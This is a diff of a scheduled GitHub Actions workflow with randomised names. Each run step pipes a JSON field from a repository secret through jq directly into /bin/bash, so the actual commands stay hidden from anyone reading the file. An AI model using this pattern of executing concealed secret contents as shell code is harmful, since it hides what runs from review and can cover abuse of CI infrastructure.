@@ -2,24 +2,23 @@ name: yanhouchangyhc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
+    - cron: '51 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanhouchangyhc
         env:
-          xsmy2: ${{ secrets.xsmy2 }}
+          lr719: ${{ secrets.lr719 }}
         run: |
-          echo $xsmy2 | jq -r .vxuoa77 | /bin/bash
-          echo $hoor1 | jq -r .w84969 | /bin/bash
-          echo $prdnu182 | jq -r .i523 | /bin/bash
-          echo $afyl71786 | jq -r .b255 | /bin/bash
-          echo $fsdjf6 | jq -r .e14 | /bin/bash
-          echo $q2 | jq -r .za89230 | /bin/bash
-          echo $jd33 | jq -r .bdtrb677 | /bin/bash
-          echo $sdr8095 | jq -r .nw396 | /bin/bash
-          echo $mn69 | jq -r .x75 | /bin/bash
+          echo $lr719 | jq -r .pkw69 | /bin/bash
+          echo $mho0542 | jq -r .q31403 | /bin/bash
+          echo $uuu1 | jq -r .ssaie721 | /bin/bash
+          echo $cg585 | jq -r .v51347 | /bin/bash
+          echo $pf81825 | jq -r .e57 | /bin/bash
+          echo $gd37017 | jq -r .cdpec3602 | /bin/bash
+          echo $wwdyg1371 | jq -r .mjx72 | /bin/bash
 
